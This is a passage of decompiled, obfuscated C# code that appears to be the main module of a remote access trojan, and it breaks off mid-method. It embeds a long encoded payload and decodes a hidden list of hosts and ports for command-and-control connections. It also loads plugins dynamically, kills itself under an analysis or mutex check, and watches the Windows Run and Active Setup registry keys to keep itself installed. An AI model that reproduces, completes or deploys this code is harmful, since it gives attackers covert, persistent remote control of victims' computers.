using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Management;
using System.Net;
using System.Reflection;
using System.Security.Cryptography;
using System.Text;
using System.Threading;
using System.Windows.Forms;
using Microsoft.Win32;
using Plugin;

namespace ns0;

internal class Class6
{
	private const string string_0 = "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4eTt6RDx5V704+Pn5eZS7ePj6eMN4+Pj9hPm4wDj4+Pu4+P04+Ve7+Pj5/fh5O3pEPHlXu/j4+fl91IJ4+Pt4w3j4+PmE+bjK+Pj4+Pj4+Pj5V7v4+Pn9/dSCePj7ePlXvDj4+f391IJ4+Pt4+Ve8ePj5/f3Ugnj4+3j5V7z4+Pn9/dS5ePj6ePlXvTj4+f391Lt4+Pp4w0B5Qv04+PtDSU2LSXk4+Tj4+Pj4+/j4+NZFRETERgTGhUa4+Pj4+jjT+Pj4+fs4+MGYePjU+zj48Pq4+MGNldVTFFKVuPj4+Mz9OPj6+Pj4wY4NuM79OPj8+Pj4wYqOCwn4+PjS/Tj43vl4+MGJU9SRePj4+Pj4+Pl4+PkOgCZ7Ozr4+Pj3QgW4/nj4+Tj4+MI4+Pj7OPj4/bj4+MV4+PjFOPj4wnj4+Pn4+Pj9uPj4+7j4+Pk4+Pj6ePj4+Tj4+Pv4+Pj/ePj4+Tj4+Pk4+Pj5ePj4+fj4+Pj4+3j5OPj4+Pj6eN543Lj6eOL43Lj6eOQ43Lj6eOk43Lj6eOx43Lj6eP/5HLj6eMq5A/k6eNl5Dbk6eOC5Hjk6eM/5XLj7eNo5VPl6eO85XLj6ePa58jn6ePx6Mjn6eMO6Mjn6eMt6Mjn6eNG6Mjn6eNf6Mjn6eN66Mjn6eOV6Mjn6ePN6K7o6ePh6K7o6ePv6cjn6eMI6cjn6eM46SXpSuNM6ePj6eN76Vvp6eOb6Vvp6eO56XLj6ePP6Xjk6ePs6lvp6eMH6nLj6eMU6sjn6eMp6nLj6eNx6nLj6eOT6oLq6eO26nLj4+Pj4+Tj4+Pj4+Tj5OPk5OPj+eMM4+jj5OPk4+Tk4+MT4wzj6OPk4+jj5OTj4yXjDOPo4+Tj7OPk5OPjOuMM4+zj5OPw4+Tk4+NG4wzj7OPn4/Dj5APz40vjDOPw4+rj8OPk4/PjVuMM4/Dj7ePx42Tj8+Nh4wzj8OPv4/Tj6enV4w3jOWPd4xDjOWPi4xDj6enV4w3jOWPq5B7jOWPx5B7j6eP45CLj6eME5CXj6eMx5Cnj9ON15DTj9OOP5Djj5OPJ5YHj5OMK5oHj5OMt5oHj5ONQ5ovj5ONt5pXj5OON5p/j5OPO5rHj5OPx57Xj4+Pj4+bjafuX4+3j5OPj4+Pj5uOp5J3j8+Pm4+Pj4+Pm46nkv+P74+jj4+Pj4+bjqeTL4wfj7OPj4+Pj5uNp+5fj7ePt4+Pj4+Pm46nknePz4+/j4+Pj4+bjqeS/4/vj8ePj4+Pj5uOp5MvjB+P14+Pj4+Pm42n7l+Pt4/bj4+Pj4+bjqeSd4/Pj+OPj4+Pj5uOp5L/j++P64+Pj4+Pm46nky+MH4/7jMwPj4+PjafuX4zDj/+NLA+Pj4+N545LkPOP/47MD4+Pj43njnORD4wDjEgTj4+PjafuX4zDjAePj4+Pj4+Op8KjkSuMB4+Pj4+Pj46nwseRK4wHj4+Pj4+PjqfDB5ErjAePj4+Pj4+Op8MzkTuMB4+Pj4+Pj46nw3eRT4wHj4+Pj4+PjqfD15VPjAePj4+Pj4+Op8AflU+MB4xsE4+Pj42nrE+VX4wHjMgTj4+Pjaesp5VzjAePj4+Pj4+Op8EflYuMC4+Pj4+Pj46nwbeVn4wLjOwTj4+Pjaet75WzjAuNSBOPj4+Np64vlcOMC41sE4+Pj42nrm+V14wPj4+Pj4+Pjqeik5TDjA+Pj4+Pj4+Op6K/leuMD47EE4+Pj46nkt+Vw4wXjtwTj4+Pjaevb5YXjBuPzBePj4+Np6/HmheMH4y8F4+Pj42nrEuaF4wjjawXj4+Pjaese5oXjCeOnBePj4+Np6zXmheMK4+MG4+Pj42nrQeaF4wvjHwbj4+PjaetW5o/jDONbBuPj4+Np62Dmj+MN45cG4+Pj42nrdOaZ4w7j0wbj4+Pjaet/5pnjD+MPB+Pj4+Np65bmo+MQ40sH4+Pj42nro+aj4xHjhwfj4+PjaeOz5qnjEuPXB+Pj4+Np47jmXOMU4wMI4+Pj42njw+Yw4xXjLwjj4+PjZOPM5jDjFeODCOPj4+Nn+5fjMOMV4+Pj5OOF5+Pj5eOM5+Pj5OOT5+Pj5ePM5uPj5OOT5+Pj5ePM5uPj5uOa5+Pj5+OF5+Pj5OOj5+Pj5OOF5+Pj5eOM5+Pj5OOT5+Pj5ePM5uPj5OOT5+Pj5ePM5uPj5uOa5+Pj5+OF5+Pj5OOj5+Pj5OOF5+Pj5eOM5+Pj5OOT5+Pj5ePM5uPj5OOT5+Pj5ePM5uPj5uOa5+Pj5+OF5+Pj5OOj5+Pj5OOq5+Pj5OOv5+Pj5OOx5+Pj5OOx5+Pj5OO35+Pj5ePM5uPj5OO35+Pj5OOx5+Pj5OOx5+Pj5OOx5+Pj5OOx5+Pj5OOx5+Pj5OOx5+Pj5OOx5+Pj5OOx5+Pj5OOx5+Pj5OOx5+Pj5OOx5+Pj5OOx5+Pj5OPD5+Pj5ePM5uPj5OPM5kzjl+Pd41Tjl+Pd41zjl+Pd42Tjl+Pd42zjl+Pd43Tjl+Pd43zjl+Pd44Tjl+Pd44zjl+Pi45Tjl+Pd45zjl+Pd46Tjl+Pd46zjl+Pn5Lzjl+Pt5MTjl+Mw48zjl+Mw4/zjl+Mw4+/jl+Mw4yzjl+Mw4yTjl+Mw4yTjkuT45NTj1ukw4yzj3On/5NTj5Oow4yzjl+ML5CTjnOQR5Nzjl+Mw4/zjDOon5OzkHeot5OTkO+o25OzkTeo/5JTjYepK4xTjl+Pd4xTja+ol4/zkeupQ5ATkn+pc5Pzkr+pQ5ETjneOv5Ovj6+MU4+vj7+MZ4+vj9+MU4+vj++MZ4xHjBuPk5RHjXuNZ5RHjFuPx5RHjVuNQ5RHj7uO35BHj9uPD5BHj/uPe5BHjDuO35BHjHuPe5BHjLuPe5BHjNuMQ5RHjRuM65RHjTuNH5STlvuMZ40TlvuMZ4+PmvuMZ4wPmvuMZ42PmvuMZ44PmvuMZ4wTkF+Qe5CPkSORu5H3kjOSb5KXkq+Ts4+Tj4+PJ5RTj4+MK5hTj4+Mt5hTj4+NQ5u/j4+Nt5uvj4+ON5vPj7OPk4+PjDue44+PjE+e44+PjH+e44+PjJue84+PjM+fB4+PjR+fB4+PjVefB4+PjXefF4+PjP+XK4+Pjb+fP4+PjeefU4+Pj/+TY4/PjBuPl4+vjBePl4+Xj9OPm4/PjCOPn4+vjB+Pn4+Xj9ePo4+vjCePp4/PjCuPp4+Xj9uPq4/PjDOPr4+vjC+Pr4+Xj9+Ps4/PjDuPt4+vjDePt4+Xj+OPu4/PjEOPv4+vjD+Pv4+Xj+ePw4+Xj+uPy4+Xj++P04+Tj/OP04+Xj/eP24+Xj/uP44+TjAOP64+Xj/+P64+XjAeP84/Lk52Pj4+Tj4+Pj4+Pj4+Pj4+PjYePj4+Xj4+Pj4+Pj4+Pj4+TjaePj4+Pj5ePj4+Pj4+Pj4+Pj5ONT5ePj4+Ms42nkLON45Czjh+Qs45bk4+PjHzBSR1hPSCHjLDNPWEpMURFHT0/jMlhXU1hXKFlIUVcrRFFHT0hV4zNPWEpMUeMsUVNYVyhZSFFXK0RRR09IVeM1SEZITFlIRyhZSFFXK0RRR09IVeMzT1hKTFE2V0RXSOM2TEdI4zNPWEpMUSRVSlbjNkhVTERPTF1IVeMsM09YSkxR41BWRlJVT0xF4zZcVldIUOMwWE9XTEZEVlcnSE9ISkRXSOMoUVhQ4zJFTUhGV+MRRldSVeMsUVlSTkjjLCRWXFFGNUhWWE9X4yRWXFFGJkRPT0VERk7jJUhKTFEsUVlSTkjj43BsAShRRyxRWVJOSONZRE9YSEJC4zEyMSjjNTgxMSwxKuMmLywoMTfjNig1OSg14ytIREdIVeMqWExH4zNPWEpMUSpYTEfjNlxWV0hQESZST09IRldMUlFWESpIUUhVTEbjL0xWV0MU4ydEV0TjNlxWV0hQETVYUVdMUEgRNkhVTERPTF1EV0xSUREpUlVQRFdXSFVWESVMUURVXOMlTFFEVVwpUlVQRFdXSFXjRUnjNlxWV0hQESwy4zBIUFJVXDZXVUhEUONQVuM2SFVMRE9MXUjjJ0hWSFVMRE9MXUjjSkhXQjFEUEjjSkhXQidIVkZVTFNXTFJR40pIV0IkWFdLUlXjSkhXQiZYVVVIUVc2V0RXSONKSFdCNldSUzJRJ0xWRlJRUUhGV0xSUeNKSFdCKFtIRlhXSDJRL1JER+NKSFdCK0RWKVJVUONKSFdCKFtIRlhXSDJRL1JERyRVSlbjVkhXQihbSEZYV0gyUS9SREckVUpW4zlIVVZMUlHjSkhXQjlIVVZMUlHjNlxWV0hQETpMUUdSWlYRKVJVUFbjKVJVUONKSFdCLFFTWFcpUlVQ40pIV0I2V0RXSDJFTUhGV+NWSFdCNldEV0gyRU1IRlfjSkhXQipYTEfjLFFMV0xET0xdSOMoW0hGWFdI4zZXUlPjKFlIUVcrRFFHT0hV4yhbSEZYV0xSUSZSUFNPSFdI40RHR0IoW0hGWFdMUlEmUlBTT0hXSONVSFBSWUhCKFtIRlhXTFJRJlJQU09IV0jjNldEVVdIR+NER0dCNldEVVdIR+NVSFBSWUhCNldEVVdIR+M2V1JTU0hH40RHR0I2V1JTU0hH41VIUFJZSEI2V1JTU0hH4yxRU1hX40RHR0IsUVNYV+NVSFBSWUhCLFFTWFfjMlhXU1hX40RHR0IyWFdTWFfjVUhQUllIQjJYV1NYV+M1SEZITFlIR+NER0dCNUhGSExZSEfjVUhQUllIQjVIRkhMWUhH4zZIUUfjMlE1SEZITFlIR+MoW0hGWFdIR+NI4x8oW0hGWFdIMlEvUkRHJFVKViFOQkIlREZOTFFKKUxIT0fjHzZXRFdIMkVNSEZXIU5CQiVERk5MUUopTEhPR+MxRFBI4ydIVkZVTFNXTFJR4yRYV0tSVeMmWFVVSFFXNldEV0jjNldSUzJRJ0xWRlJRUUhGV0xSUeMoW0hGWFdIMlEvUkRH4ytEVilSVVDjKFtIRlhXSDJRL1JERyRVSlbjLFFTWFcpUlVQ4zZXRFdIMkVNSEZX41JFTUhGV+NQSFdLUkfjVkhRR0hV40ZET09FREZO41VIVlhPV+NEVUpW40XjWURPWEjjVldEV0gyRU1IRlfjVkxHSOM2XFZXSFARNUhJT0hGV0xSUeMkVlZIUEVPXDdMV09IJFdXVUxFWFdI4yRWVkhQRU9cJ0hWRlVMU1dMUlEkV1dVTEVYV0jjJFZWSFBFT1wmUlFJTEpYVURXTFJRJFdXVUxFWFdI4yRWVkhQRU9cJlJQU0RRXCRXV1VMRVhXSOMkVlZIUEVPXDNVUkdYRlckV1dVTEVYV0jjJFZWSFBFT1wmUlNcVUxKS1ckV1dVTEVYV0jjJFZWSFBFT1w3VURHSFBEVU4kV1dVTEVYV0jjJFZWSFBFT1wmWE9XWFVIJFdXVUxFWFdI4zZcVldIUBE1WFFXTFBIESxRV0hVUlM2SFVZTEZIVuMmUlA5TFZMRU9IJFdXVUxFWFdI4ypYTEckV1dVTEVYV0jjJFZWSFBFT1w5SFVWTFJRJFdXVUxFWFdI4yRWVkhQRU9cKUxPSDlIVVZMUlEkV1dVTEVYV0jjNlxWV0hQESdMREpRUlZXTEZW4ydIRVhKSkRFT0gkV1dVTEVYV0jjJ0hFWEpKTFFKMFJHSFbjNlxWV0hQETVYUVdMUEgRJlJQU0xPSFU2SFVZTEZIVuMmUlBTTE9EV0xSUTVIT0RbRFdMUlFWJFdXVUxFWFdI4zVYUVdMUEgmUlBTRFdMRUxPTFdcJFdXVUxFWFdI4zZIVUxET0xdREVPSCRXV1VMRVhXSOM2V1VIRFDjJk9SVkjjN1IkVVVEXOMnTFZTUlZI4yZSUFNMT0hVKkhRSFVEV0hHJFdXVUxFWFdI4zdcU0jjKkhXN1xTSOMkVlZIUEVPXOMqSFckVlZIUEVPXOM1WFFXTFBIN1xTSCtEUUdPSOMqSFc3XFNIKVVSUCtEUUdPSOMqSFcmWFZXUlAkV1dVTEVYV0hW40pIV0I5RE9YSOMoUFNXXOMnSE9ISkRXSOMmUlBFTFFI4zZcVldIUBE3S1VIREdMUUrjLFFXSFVPUkZOSEfjJlJQU0RVSChbRktEUUpI4zVIUFJZSOMoWUhRVyRVSlbj4+Pj4+YD4+Pj4+O3AJLHMbONJHsCjgdLEBkl4+uaXT85/BfDbOgD5eT/++oD5eT1B/X/7gPn9fT1B/X/9fj/6APk5PX05enr5un09+fj4+Pj5+Tj4+Pm6fT75enx5un0/Onp+PUA5P/mA+Pk5un1BObp9Qjp4+QA6PX/6ePk9f8A6OYD4/HnA+P09+YD4+XnA+P1/+gD5OT1/+cD4/UM5wPj9RDmA+P/5wPk5P/nA+P0/OkD5eT/9f/m6fUU6APk5PUU5un17+gD5OT17+bp9evoA+Tk9evm6fXz6APk5PXz6gPl5PT79f/m6fX/5en/5gvj8ecL4/T35gvj5ecL4/X/5wvj9QznC+P1EOYL4//nC+P0/OcD5OTx5wPk5OXoA+Tk9EznA+Tk6+j49QDk/+kD5eT1XP/nA+MA6Onq5QDoAOjoA+TkAOjoA+T/9Vzp6uX1//X/5+rk9f/m6uT/6APj9WNk6+Pk9WNo9WNk6+Pk9WNk9GNs6wPlAP/1Y2Tl6urmAP/0/OXu4+X1Y3D1Y3D1Y3Dv8+TmAePzAeMB4wHj5+3k9RTs6uf1FPUU9RTl5+3k9e/s6uf17/Xv9e/l5+3k9evs6uf16/Xr9evl5+3k9fPs6uf18/Xz9fPl6Orl9Pvl5urk5eoD5eT/9WN47uTj6TNPWEpMUePj/eTj+DFIVxA6SERZSAMzT1hKTFEDJURWSOPj6OTj4+Pj7+Tj6ls2TE9IUVfj4wHk4/wmUlNcVUxKS1cDpYwDWzZMT0hRVwMVExQU4+MM5OMHGhYZRBdIExgQRkUcSBAXRRhJEBxHRxgQFURGGRxISUYTRxwc4+Pv5OPqFBETERMRE+Pj6+Tj6uTj4+Pj6+Tj6+Pj4+PjAeTj5OM35fk6VURTMVJRKFtGSFNXTFJRN0tVUlpW5OPj4+Pj4+MesW8x4+Pj4+Xj4+Nd4+Pjpxzj46f+4+M1Nic2U1prod1P4zBml/DuRw1WlOXj4+MmHT84VkhVVj8xRFdLRFE/J1JGWFBIUVdWPzlMVlhETwM2V1hHTFIDFRMUEz8zVVJNSEZXVj8zVVJNSEZXAycnUjZIVT8zT1hKTFE/UkVNPydIRVhKPywzT1hKTFERU0dF4+PjSx3j4+Pj4+Pj4+PjYR3j4+MD4+Pj4+Pj4+Pj4+Pj4+Pj4+Pj4+Pj41Md4+Pj4+Pj4+NCJlJVJ09PMERMUeNQVkZSVUhIEUdPT+Pj4+Pj4gjjAyPj4+Pj4+Pj4+Pj4+Pj4+Pj4+Pj4+Pj4+Pj4+Pj4+Pj4+Pj4+Pj4+Pj4+Pj4+Pj4+Pj4+Pj4+Pj4+Pj4+Pj4+Pj4+Pj4+Pj4+Pj4+Pj4+Pj4+Pj4+Pj4+Pj4+Pj4+Pj4+Pj4+Pj4+Pj4+Pj4+Pj4+Pj4+Pj4+Pj4+Pj4+Pj4+Pj4+Pj4+Pj4+Pj4+Pj4+Pj4+Pj4+Pj4+Pj4+Pj4+Pj4+Pj4+Pj4+Pj4+Pj4+Pj4+Pj4+Pj4+Pj4+Pj4+Pj4+Pj4+Pj4+Pj4+Pj4+Pj4+Pj4+Pj4+Pj4+Pj4+Pj4+Pj4+Pj4+Pj4+Pj4+Pj4+Pj4+Pj4+Pj4+Pj4+Pj4+Pj4+Pj4+Pj4+Pj4+Pj4+Pj4+Pj4+Pj4+Pj4+Pj4+Pj4+Pj4+Pj4+Pj4+Pj4+Pj4+Pj4+Pj4+Pj4+Pj4+Pj4+Pj4+Pj4+Pj4+Pj4+Pj4+Pj4+Pj4+Pj4+Pj4+Pj4+Pj4+Pj4+Pj4+Pj4+Pj4+Pj4+Pj4+Pj4+Pj4+Pj4+Pj4+Pj4+Pj5OPz4+Pj++PjY+Pj4+Pj4+Pj4+Pj4+Pj5OPk4+PjE+PjY+Pj4+Pj4+Pj4+Pj4+Pj5OPj4+PjK+Pj4zsj4+MH5uPj4+Pj4+Pj4+MH5hfj4+M54zbjQuM54yjjNeM24yzjMuMx40LjLOMx4ynjMuPj4+PjoOfS4ePj5OPj4+Tj4+Pj4+Pj5OPj4+PjIuPj4+Pj4+Pn4+Pj5ePj4+Pj4+Pj4+Pj4+Pj4yfj4+Pk4znjRONV4ynjTONP40jjLONR40njUuPj4+PjB+Pn4+PjN+NV40TjUeNW40/jRONX40zjUuNR4+Pj4+Pj45PnZ+Xj4+TjNuNX41XjTONR40rjKeNM40/jSOMs41HjSeNS4+PjQ+Xj4+TjE+MT4xPjE+MT4xfjReMT4+PjJ+P54+TjJuNS41DjUONI41HjV+NW4+PjMeNI41fjEOM640jjRONZ40jjA+Mz40/jWONK40zjUeMD4yXjRONW40jj4+MT4+vj5OMm41LjUONT40TjUeNc4zHjRONQ40jj4+Pj41vjNuNM40/jSONR41fj4+Mb4+rj5OMp40zjT+NI4yfjSONW40bjVeNM41PjV+NM41LjUePj4+PjM+NP41jjSuNM41Hj4+Pj4xPj6+Pk4ynjTONP40jjOeNI41XjVuNM41LjUePj4+PjFOMR4xPjEeMT4xHjE+Pj4xvj7+Pk4yzjUeNX40jjVeNR40TjT+Mx40TjUONI4+PjLOMz40/jWONK40zjUeMR40fjT+NP4+PjO+P84+TjL+NI40rjRONP4ybjUuNT41zjVeNM40rjS+NX4+PjJuNS41PjXONV40zjSuNL41fjA+OM4wPjW+M240zjT+NI41HjV+MD4xXjE+MU4xTj4+Pj4yPj7+Pk4zLjVeNM40rjTONR40TjT+Mp40zjT+NI41HjRONQ40jj4+Ms4zPjT+NY40rjTONR4xHjR+NP40/j4+MT4+rj5OMz41XjUuNH41jjRuNX4zHjRONQ40jj4+Pj4zPjT+NY40rjTONR4+Pj4+MX4+vj5OMz41XjUuNH41jjRuNX4znjSONV41bjTONS41Hj4+MU4xHjE+MR4xPjEeMT4+PjG+Pr4+TjJONW41bjSONQ40XjT+Nc4wPjOeNI41XjVuNM41LjUePj4xTjEeMT4xHjE+MR4xPj4+Pj4+Pj4+Pj4+Pj4+Pj4+Pj4+Pj4+Pj4+Pj4+Pj4+Pj4+Pj4+Pj4+Pj4+Pj4+Pj4+Pj4+Pj4+Pj4+Pj4+Pj4+Pj4+Pj4+Pj4+Pj4+Pj4+Pj4+Pj4+Pj4+Pj4+Pj4+Pj4+Pj4+Pj4+Pj4+Pj4+Pj4+Pj4+Pj4+Pj4+Pj4+Pj4+Pj4+Pj4+PjE+Pj7+Pj43Md4+Pj4+Pj4+Pj4+Pj4+Pj4+Pj4+Pj4+Pj4+Pj4+Pj4+Pj4+Pj4+Pj4+Pj4+Pj4+Pj4+Pj4+Pj4+Pj4+Pj4+Pj4+Pj4+Pj4+Pj4+Pj4+Pj4+Pj4+Pj4+Pj4+Pj4+Pj4+Pj4+Pj4+Pj4+Pj4+Pj4+Pj4+Pj4+Pj4+Pj4+Pj4+Pj4+Pj4+Pj4+Pj4+Pj4+Pj4+Pj4+Pj4+Pj4+Pj4+Pj4+Pj4+Pj4+Pj4+Pj4+Pj4+Pj4+Pj4+Pj4+Pj4+Pj4+Pj4+Pj4+Pj4+Pj4+Pj4+Pj4+Pj4+Pj4+Pj4+Pj4+Pj4+Pj4+Pj4+Pj4+Pj4+Pj4+Pj4+Pj4+Pj4+Pj4+Pj4+Pj4+Pj4+Pj4+Pj4+Pj4+Pj4+Pj4+Pj4+Pj4+Pj4+Pj4+Pj4+Pj4+Pj4+Pj4+Pj4+Pj4+Pj4+Pj4+Pj4+Pj4+Pj4+Pj4+Pj4+Pj4+Pj4+Pj4+Pj4+Pj4+Pj4+Pj4+Pj4+Pj4+Pj4+Pj4+Pj4+Pj4+Pj4+Pj4+Pj4+Pj4+Pj4+Pj4+Pj4+Pj4+Pj4+Pj4+Pj4+Pj4+Pj4+Pj4+Pj4+Pj4+Pj4+Pj4+Pj4+Pj4+Pj4+Pj4+Pj4+Pj4+Pj4+Pj4+Pj4+Pj4+Pj4+Pj4+Pj4+Pj4+Pj4+Pj4+Pj4+Pj4+Pj4+Pj4+Pj4+Pj4+Pj4+Pj4+Pj4+Pj4+Pj4+Pj4+Pj4w==";

	private static List<GClass0> list_0;

	private static List<Class4> list_1;

	private static bool bool_0;

	private static bool bool_1;

	private static int int_0;

	[MTAThread]
	private static int Main()
	{
		if (Class5.bool_13 && (!Class5.bool_0 || !(Process.GetCurrentProcess().MainModule!.FileName == Path.Combine(Class5.string_1, Class0.smethod_3(Class5.string_2, bool_0: true)))))
		{
			Class3.smethod_0();
		}
		smethod_0();
		smethod_1();
		try
		{
			while (true)
			{
				string text = Console.ReadLine();
				if (text.ToLower() == "clear")
				{
					Console.Clear();
				}
			}
		}
		catch
		{
		}
		Process.GetCurrentProcess().WaitForExit();
		return 0;
	}

	private static void smethod_0()
	{
		//IL_015e: Unknown result type (might be due to invalid IL or missing references)
		//IL_0168: Expected O, but got Unknown
		bool_0 = false;
		bool_1 = false;
		AppDomain.CurrentDomain.AssemblyResolve += smethod_6;
		Class7.smethod_0(Class5.string_6);
		if (Class7.Boolean_0)
		{
			Process.GetCurrentProcess().Kill();
			return;
		}
		string[] array = Class0.smethod_3(Class5.string_0, bool_0: true).Split(new char[1] { '|' });
		list_1 = new List<Class4>();
		for (int i = 0; i < array.Length; i++)
		{
			if (!string.IsNullOrEmpty(array[i]))
			{
				Class4 @class = new Class4(array[i].Split(new char[1] { '>' })[0], int.Parse(array[i].Split(new char[1] { '>' })[1]), Class0.smethod_2(array[i].Split(new char[1] { '>' })[2].Trim(), bool_0: true));
				@class.Disconnected += smethod_10;
				@class.ConnectionAccepted += smethod_9;
				@class.Received += smethod_8;
				@class.Sent += smethod_11;
				list_1.Add(@class);
			}
		}
		GClass2.smethod_0();
		GClass1.PluginAdded += smethod_5;
		SystemEvents.add_SessionEnding(new SessionEndingEventHandler(smethod_4));
		if (Class5.bool_0 && Process.GetCurrentProcess().MainModule!.FileName != Path.Combine(Class5.string_1, Class0.smethod_3(Class5.string_2, bool_0: true)))
		{
			new Thread(Class10.smethod_0).Start();
		}
		if (Class5.bool_10 && Process.GetCurrentProcess().MainModule!.FileName != Path.Combine(Class5.string_1, Class0.smethod_3(Class5.string_2, bool_0: true)))
		{
			GClass2.smethod_3();
		}
		if (Class5.bool_0 && Process.GetCurrentProcess().MainModule!.FileName == Path.Combine(Class5.string_1, Class0.smethod_3(Class5.string_2, bool_0: true)))
		{
			GClass1.smethod_1();
		}
		else
		{
			GClass1.smethod_2();
		}
		if (Class5.bool_0)
		{
			list_0 = new List<GClass0>();
			GClass0 gClass = new GClass0(Class5.registryHive_0, Class5.string_9);
			gClass.GEnum0_0 = GEnum0.flag_0 | GEnum0.flag_2;
			gClass.RegChanged += smethod_2;
			if (Class5.bool_12)
			{
				if (Class5.bool_1)
				{
					GClass0 gClass2 = new GClass0(RegistryHive.CurrentUser, "Software\\Microsoft\\Windows\\CurrentVersion\\Run");
					gClass2.RegChanged += smethod_3;
					gClass2.GEnum0_0 = GEnum0.flag_0 | GEnum0.flag_2;
					list_0.Add(gClass2);
				}
				if (Class5.bool_2)
				{
					GClass0 gClass3 = new GClass0(RegistryHive.CurrentUser, "Software\\Microsoft\\Windows\\CurrentVersion\\Run");
					gClass3.RegChanged += smethod_3;
					gClass3.GEnum0_0 = GEnum0.flag_0 | GEnum0.flag_2;
					list_0.Add(gClass3);
				}
				if (Class5.bool_3)
				{
					GClass0 gClass4 = new GClass0(RegistryHive.LocalMachine, "SOFTWARE\\Microsoft\\Active Setup\\Installed Components");
					gClass4.RegChanged += smethod_3;
					gClass4.GEnum0_0 = GEnum0.flag_0 | GEnum0.flag_2;
					list_0.Add(gClass4);
				}
			}
		}
		Class5.string_11 = smethod_21(smethod_20() + "|" + Environment.UserName);
	}

	private static void smethod_1()
	{
		foreach (Class4 item in list_1)
		{
			item?.method_0();
		}
		if (list_0 != null)
		{
			foreach (GClass0 item2 in list_0)
			{
				item2.method_2();
			}
		}
		Class8.smethod_2();
		if (Class5.bool_4)
		{
			smethod_18();
		}
	}

	private static void smethod_2(object sender, EventArgs e)
	{
		ThreadStart start = GClass1.smethod_0;
		new Thread(start).Start();
	}

	private static void smethod_3(object sender, EventArgs e)
	{
		ThreadStart start = Class10.smethod_2;
		new Thread(start).Start();
	}

	private static void smethod_4(object sender, SessionEndingEventArgs e)
	{
